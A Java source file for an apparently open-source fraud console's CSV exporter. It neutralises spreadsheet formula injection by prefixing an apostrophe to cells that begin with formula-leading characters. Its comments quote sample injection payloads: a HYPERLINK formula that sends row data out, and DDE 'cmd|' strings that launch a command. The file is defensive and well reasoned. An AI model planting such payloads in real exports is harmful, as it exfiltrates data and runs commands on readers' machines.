/* SPDX-License-Identifier: Apache-2.0 */
package io.github.la3679.sentinelflow.api.report;

import java.util.List;

/**
 * RFC 4180 CSV, with the one defence a fraud console cannot do without.
 *
 * <h2>Formula injection is the point of this class</h2>
 *
 * A spreadsheet treats a cell beginning with {@code =}, {@code +}, {@code -} or {@code @} as a
 * formula and evaluates it on open. {@code =HYPERLINK("https://…"&A1)} exfiltrates the row it sits
 * in; {@code =cmd|'/c calc'!A1} has historically executed a command through DDE. Neither needs the
 * file to be opened by the person who exported it, and neither is a defect in the spreadsheet — it
 * is what a formula is.
 *
 * <p><strong>This matters here specifically.</strong> An alert summary is built from a transaction
 * reference and a reason code, but an analyst's note is free text, and the transaction that raised
 * the alert arrived through an ingestion endpoint that is open (ADR-0012 §5). So a cell in this
 * export can contain characters somebody outside the system chose, and the export is a file an
 * operations team opens in Excel.
 *
 * <p><strong>The defence is a prefixed apostrophe</strong>, which every major spreadsheet reads as
 * "this cell is text". Escaping the leading character instead — a backslash, a space — either
 * changes the value or is not honoured; refusing the row would lose data the export exists to carry.
 * The apostrophe is visible in the cell, which is the cost, and it is the right cost: a cell that
 * shows {@code '=SUM(A1)} is one somebody can look at and understand, where a silently evaluated one
 * is not.
 *
 * <h2>The tab and the carriage return are on the list too</h2>
 *
 * Both are treated as formula-leading characters by at least one spreadsheet, and neither has any
 * business at the start of a value in this export. They are quoted like anything else as well; the
 * prefix is belt and braces for the reader that unquotes before it decides.
 */
public final class CsvWriter {

    /**
     * Characters that make a spreadsheet read the rest of the cell as a formula.
     *
     * <p>{@code -} is on the list even though a negative number legitimately starts with one. A
     * negative number in this export is prefixed and reads as text, which is worse for arithmetic
     * and better than the alternative: allowing {@code -2+3+cmd|'/c calc'!A0}, which is a formula
     * that begins like a number.
     */
    private static final String FORMULA_LEADERS = "=+-@\t\r";

    /** RFC 4180 says a field containing any of these must be quoted. */
    private static final String MUST_QUOTE = ",\"\n\r";

    /** CRLF, which RFC 4180 specifies and which Excel expects. */
    static final String LINE_ENDING = "\r\n";

    private CsvWriter() {}

    /** One header or data row, terminated. */
    public static String row(List<String> cells) {
        StringBuilder line = new StringBuilder();
        for (int index = 0; index < cells.size(); index++) {
            if (index > 0) {
                line.append(',');
            }
            line.append(cell(cells.get(index)));
        }
        return line.append(LINE_ENDING).toString();
    }

    /**
     * One cell: neutralised if it could be a formula, then quoted if it needs to be.
     *
     * <p>Order matters. Prefixing first and quoting second means the apostrophe is inside the quotes
     * where a reader will find it; quoting first would put it outside and make the field unparseable.
     *
     * @param value may be null, which is written as an empty field rather than as the four letters
     *     of {@code null}
     */
    static String cell(String value) {
        if (value == null || value.isEmpty()) {
            return "";
        }
        String neutralised = FORMULA_LEADERS.indexOf(value.charAt(0)) >= 0 ? "'" + value : value;
        return needsQuoting(neutralised) ? quote(neutralised) : neutralised;
    }

    private static boolean needsQuoting(String value) {
        for (int index = 0; index < value.length(); index++) {
            if (MUST_QUOTE.indexOf(value.charAt(index)) >= 0) {
                return true;
            }
        }
        // A leading or trailing space survives a round trip only inside quotes,
        // and a reference with one is a reference somebody will fail to match.
        return value.charAt(0) == ' ' || value.charAt(value.length() - 1) == ' ';
    }

    /** RFC 4180 quoting: wrap in quotes, and double any quote inside. */
    private static String quote(String value) {
        return '"' + value.replace("\"", "\"\"") + '"';
    }
}
